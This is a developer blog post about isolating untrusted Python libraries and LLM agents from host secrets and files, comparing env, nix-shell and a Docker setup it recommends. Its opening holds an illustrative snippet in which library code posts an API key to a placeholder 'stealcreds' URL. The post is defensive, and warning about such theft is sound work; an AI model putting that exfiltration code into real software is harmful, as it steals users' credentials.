---
title: Sandboxed Python Environment
createdAt: 2024-01-21T03:53:12.000Z
updatedAt: 2024-01-21T03:53:12.000Z
publishedAt: 2024-01-21T03:53:12.000Z
tags:
  - language_models
  - python
  - security
  - nix
  - docker
draft: false
githubUrl: 'https://github.com/danielcorin/toys/tree/main/sandboxed_python'
---

Disclaimer: I am not a security expert or a security professional.

I've tried out many new AI/LLM libraries in the past year.
Many of these are written in Python.
While trying out new and exciting software is a lot of fun, it's also important to be mindful about what code you allow to run on your system.
Even if code is open source, it's still _possible_ that the cool open source library you installed includes code like

```python
import httpx
import os

httpx.post(
    'https://someoneswebsite.com/stealcreds',
    data={'key': os.environ.get("OPENAI_API_KEY")},
)
```

I strongly recommend vetting any libraries you use, using separate API keys per app and setting a spend cap on OpenAI in case your key is compromised.
However, your `OPENAI_API_KEY` isn't all you need to worry about.
Python code (including dependencies) has access to your entire `os.environ`.
It's somewhat common to set environment variables for the shell to be available system wide.
Zsh has a dedicated file that gets sourced when the shell starts up (`.zshenv`).
So if you hypothetically had `GITHUB_API_TOKEN` set in your environment, some open source library could send that secret to its own server and gain access to your stuff.

Thankfully, over time, open source libraries _usually_ are scrutinized to the degree that this type of credential stealing becomes more difficult to execute or scale.
However, with the advent of agent-like, language-model-based systems, certain libraries are now asking us to allow them to execute system commands on our behalf.
While many of these require user approval, some have automatic approval capabilities, allowing a language model to roam freely among your system.
If you're reading this article, you probably already know this isn't an awesome idea.

## Some trial and error

I tried several approaches to solve this problem before I identified one that seemed to address most of my concerns.
My goal was to find a safe setup that expected code to use a language model to execute code, peek at my environment or poke around the file system.

### Trying out env

My initial inclination was to try and clear out my environment variables to protect against a program trying to steal my secrets.
The `env -i` command can execute a shell command with an empty environment.
Unfortunately, this approach removes too much of what is needed to run Python, so it wasn't viable.

```sh
❯ env -i python run.py
env: python: No such file or directory
```

### Trying out nix

[Nix](https://nixos.org/) seemed like another possible candidate that could manage an independent version of Python and my dependencies
After a bit of searching, I found a way to create a shell with a nix-specified environment using `nix-shell`.
Loosely following instructions from [this article](https://churchman.nl/2019/01/22/using-nix-to-create-python-virtual-environments/), I created a `shell.nix` file with the following contents

```nix
{ nixpkgs ? import <nixpkgs> {}, pythonVersion ? "python3" }:

nixpkgs.mkShell {
  buildInputs = [
    (nixpkgs.${pythonVersion})
    (nixpkgs.python3Packages.numpy)
    (nixpkgs.python3Packages.openai)
  ];

  shellHook = ''
    echo "Welcome to your Python development environment."
  '';
}
```

I ran `nix-shell` from the same directory, which put me in a shell (within my shell) with a specific version of Python and my specified dependencies installed.

```sh
❯ nix-shell
Welcome to your Python development environment.

❯ which python
/nix/store/<...>-python3-3.11.7/bin/python

❯ python
Python 3.11.7 ...
Type "help", "copyright", "credits" or "license" for more information.
>>> import openai
>>> import numpy
>>>
```

Nix worked as advertised, but I realized this approach didn't provide isolation from my environment variables or my system.
Any Python code I ran from the within the nix shell could still read my environment variables or mess with my host file system if it was malicious.

Nix also has the ability to run a `pure` shell, which per the [docs](https://nixos.org/manual/nix/unstable/command-ref/nix-shell.html#options), will clear most of the environment variables.
I tried this out but it quickly became apparent it was too stripped down for what I was looking for.
It also still had host file system access.

```sh
❯ nix-shell --pure
Welcome to your Python development environment.

[nix-shell:~/dev/try/try_wrapper]$ which python
bash: which: command not found
```

## Using Docker

Given the two main constraints

- host environment variable protection
- host file system protection

I moved on to try and find an approach using Docker, which I knew to provide better file system isolation and an independent set of environment variables.
This approach has become the one I use when I want to try out a new library to get a sense of its capabilities while being mindful of my system's privacy.

Here is how it works.
First, I created a new project with the following files and contents

```text
.
├── .env
├── Dockerfile
├── Makefile
├── requirements.txt
└── run.py
```

`.env`

```env
OPENAI_API_KEY=<your key>
# any other variables
```

`Dockerfile`

```txt
FROM python:slim
WORKDIR /usr/src/app
COPY requirements.txt ./
RUN pip install --no-cache-dir -r requirements.txt
COPY *.py /usr/src/app
CMD ["python", "./run.py"]
```

`run.py`

```python
import os
from openai import OpenAI
from dotenv import load_dotenv

load_dotenv()

OPENAI_API_KEY = os.environ.get("OPENAI_API_KEY")

client = OpenAI(api_key=OPENAI_API_KEY)

stream = client.chat.completions.create(...)
# the rest of the code
```

`requirements.txt`

```text
openai
python-dotenv
# any other libraries you want to install
```

`Makefile`

```make
.PHONY: run
run:
	docker build -t run_script . && docker run -it --env-file .env run_script
```

With this setup, I added my environment variables to `.env`, my dependencies to `requirements.txt`, my code to `run.py` and to run it all, `make run`, which builds and runs the container defined in `Dockerfile`.

It's not the easiest or the cleanest approach for ongoing development of a project, but it provides a reasonable way to sandbox and isolate new code you want to try out that your don't necessarily trust.
I did several hours of research to find an approach I was satisfied with but I suspect there are other good options out there.
I would love to hear from you if you have an approach you like.

You can find the code from this post [here](https://github.com/danielcorin/toys/tree/main/sandboxed_python).
